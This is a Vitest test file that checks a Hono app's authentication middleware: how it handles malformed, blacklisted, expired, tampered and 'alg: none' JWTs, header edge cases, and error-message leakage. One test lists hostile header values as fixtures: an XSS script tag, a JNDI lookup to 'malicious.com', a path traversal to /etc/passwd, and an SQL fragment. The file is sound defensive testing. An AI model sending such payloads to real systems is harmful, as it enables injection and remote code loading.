import { describe, it, expect, beforeEach, vi, type Mock } from 'vitest';
import { Hono } from 'hono';
import { authMiddleware, requireAuth } from '@/middleware/auth';
import { generateToken, verifyToken, blacklistToken, isTokenBlacklisted } from '@/utils/auth';
import type { ContextVariableMap } from '@/types/hono';

// Mock the auth utilities
vi.mock('@/utils/auth');

const mockGenerateToken = generateToken as Mock;
const mockVerifyToken = verifyToken as Mock;
const mockBlacklistToken = blacklistToken as Mock;
const mockIsTokenBlacklisted = isTokenBlacklisted as Mock;

describe('Security - Auth Validation Tests', () => {
  let app: Hono<{ Variables: ContextVariableMap }>;

  beforeEach(() => {
    app = new Hono<{ Variables: ContextVariableMap }>();
    vi.clearAllMocks();
  });

  describe('Token Security', () => {
    it('should reject tokens without Bearer prefix', async () => {
      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'InvalidPrefix token123' }
      });
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('INVALID_TOKEN');
      expect(mockVerifyToken).not.toHaveBeenCalled();
    });

    it('should reject empty Authorization header', async () => {
      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: '' }
      });
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('INVALID_TOKEN');
    });

    it('should reject malformed Bearer tokens', async () => {
      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const malformedTokens = [
        'Bearer',
        'Bearer ',
        'Bearer token with spaces',
        'Bearer token\nwith\nnewlines',
        'Bearer token\twith\ttabs'
      ];

      for (const token of malformedTokens) {
        const req = new Request('http://localhost/protected', {
          headers: { Authorization: token }
        });
        const res = await app.request(req);
        const body = await res.json();

        expect(res.status).toBe(401);
        expect(body.error.code).toBe('INVALID_TOKEN');
      }
    });

    it('should handle extremely long tokens', async () => {
      const veryLongToken = 'a'.repeat(10000);
      mockVerifyToken.mockRejectedValue(new Error('Token too long'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: `Bearer ${veryLongToken}` }
      });
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('TOKEN_VERIFICATION_FAILED');
    });
  });

  describe('Token Blacklist Security', () => {
    it('should reject blacklisted tokens immediately', async () => {
      mockVerifyToken.mockResolvedValue({ userId: 1, email: 'test@example.com' });
      mockIsTokenBlacklisted.mockResolvedValue(true);

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer blacklisted-token' }
      });
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('TOKEN_BLACKLISTED');
      expect(mockIsTokenBlacklisted).toHaveBeenCalledWith('blacklisted-token');
    });

    it('should handle blacklist check failures gracefully', async () => {
      mockVerifyToken.mockResolvedValue({ userId: 1, email: 'test@example.com' });
      mockIsTokenBlacklisted.mockRejectedValue(new Error('Database error'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer test-token' }
      });
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('TOKEN_VERIFICATION_FAILED');
    });
  });

  describe('JWT Security Vulnerabilities', () => {
    it('should reject tokens with algorithm confusion attacks', async () => {
      mockVerifyToken.mockRejectedValue(new Error('Invalid algorithm'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.payload.signature' }
      });
      const res = await app.request(req);

      expect(res.status).toBe(401);
    });

    it('should reject tokens with tampered signatures', async () => {
      mockVerifyToken.mockRejectedValue(new Error('Invalid signature'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer valid.payload.tampered-signature' }
      });
      const res = await app.request(req);

      expect(res.status).toBe(401);
    });

    it('should reject expired tokens', async () => {
      mockVerifyToken.mockRejectedValue(new Error('Token expired'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer expired-token' }
      });
      const res = await app.request(req);

      expect(res.status).toBe(401);
    });
  });

  describe('Authorization Edge Cases', () => {
    it('should handle multiple Authorization headers', async () => {
      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected');
      // Manually add multiple Authorization headers
      req.headers.append('Authorization', 'Bearer token1');
      req.headers.append('Authorization', 'Bearer token2');

      const res = await app.request(req);

      // Should handle gracefully (typically uses first header)
      expect(res.status).toBe(401);
    });

    it('should be case-sensitive for Bearer prefix', async () => {
      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const caseSensitiveTests = [
        'bearer valid-token',
        'BEARER valid-token',
        'Bearer valid-token', // This should work
        'BeArEr valid-token'
      ];

      for (const authHeader of caseSensitiveTests) {
        const req = new Request('http://localhost/protected', {
          headers: { Authorization: authHeader }
        });
        const res = await app.request(req);

        if (authHeader === 'Bearer valid-token') {
          // This should trigger token verification
          expect(mockVerifyToken).toHaveBeenCalled();
        } else {
          // Others should be rejected immediately
          expect(res.status).toBe(401);
        }
      }
    });
  });

  describe('Rate Limiting on Auth Failures', () => {
    it('should handle rapid auth failure attempts', async () => {
      mockVerifyToken.mockRejectedValue(new Error('Invalid token'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      // Simulate rapid failed attempts
      const requests = Array(10).fill(0).map((_, i) =>
        new Request('http://localhost/protected', {
          headers: { Authorization: `Bearer invalid-token-${i}` }
        })
      );

      const responses = await Promise.all(requests.map(req => app.request(req)));

      // All should fail with 401
      responses.forEach(res => {
        expect(res.status).toBe(401);
      });

      // Verify token was checked for each attempt
      expect(mockVerifyToken).toHaveBeenCalledTimes(10);
    });
  });

  describe('Session Security', () => {
    it('should not leak user information in error responses', async () => {
      mockVerifyToken.mockRejectedValue(new Error('Database connection failed'));

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer valid-token' }
      });
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.message).not.toContain('Database connection failed');
      expect(body.error.message).toBe('Token verification failed');
    });

    it('should require authentication for protected endpoints', async () => {
      app.use('*', requireAuth);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected');
      const res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('AUTHENTICATION_REQUIRED');
    });
  });

  describe('Token Lifecycle Security', () => {
    it('should prevent token reuse after blacklisting', async () => {
      const validUser = { userId: 1, email: 'test@example.com', jti: 'token-123' };
      
      // First request - token is valid
      mockVerifyToken.mockResolvedValue(validUser);
      mockIsTokenBlacklisted.mockResolvedValue(false);

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ user: c.get('user') }));

      let req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer valid-token' }
      });
      let res = await app.request(req);

      expect(res.status).toBe(200);

      // Blacklist the token
      mockBlacklistToken.mockResolvedValue(undefined);
      await blacklistToken('valid-token');

      // Second request - same token should now be blacklisted
      mockIsTokenBlacklisted.mockResolvedValue(true);

      req = new Request('http://localhost/protected', {
        headers: { Authorization: 'Bearer valid-token' }
      });
      res = await app.request(req);
      const body = await res.json();

      expect(res.status).toBe(401);
      expect(body.error.code).toBe('TOKEN_BLACKLISTED');
    });
  });

  describe('Input Validation Security', () => {
    it('should handle null and undefined authorization headers', async () => {
      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      const req = new Request('http://localhost/protected');
      // Don't set Authorization header at all
      const res = await app.request(req);

      // Should handle gracefully for public endpoints
      expect(res.status).toBe(200);
    });

    it('should sanitize user input in token verification', async () => {
      const maliciousInputs = [
        'Bearer <script>alert("xss")</script>',
        'Bearer ${jndi:ldap://malicious.com}',
        'Bearer ../../../etc/passwd',
        'Bearer SELECT * FROM users;',
      ];

      app.use('*', authMiddleware);
      app.get('/protected', (c) => c.json({ message: 'success' }));

      for (const maliciousInput of maliciousInputs) {
        mockVerifyToken.mockRejectedValue(new Error('Invalid token'));

        const req = new Request('http://localhost/protected', {
          headers: { Authorization: maliciousInput }
        });
        const res = await app.request(req);

        expect(res.status).toBe(401);
        // Verify the malicious content was passed to verification (where it gets sanitized)
        expect(mockVerifyToken).toHaveBeenCalledWith(
          maliciousInput.replace('Bearer ', '')
        );
      }
    });
  });
});